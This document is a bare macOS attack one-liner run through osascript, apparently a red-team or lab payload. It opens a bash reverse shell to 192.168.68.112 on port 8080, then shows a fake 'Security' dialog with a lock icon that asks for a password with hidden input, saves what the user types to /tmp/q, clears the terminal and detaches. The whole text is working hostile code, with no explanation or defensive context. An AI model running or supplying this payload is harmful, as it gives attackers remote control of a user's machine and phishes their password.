osascript -e '
do shell script "bash -i >& /dev/tcp/192.168.68.112/8080 0>&1 &"
set userInput to (display dialog "Do not enter password:" default answer "" with hidden answer with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" with title "Security" buttons {"pwnd"} default button "pwnd")
set q to text returned of userInput
do shell script "echo " & quoted form of q & " > /tmp/q"
do shell script "clear"' & disown; exit
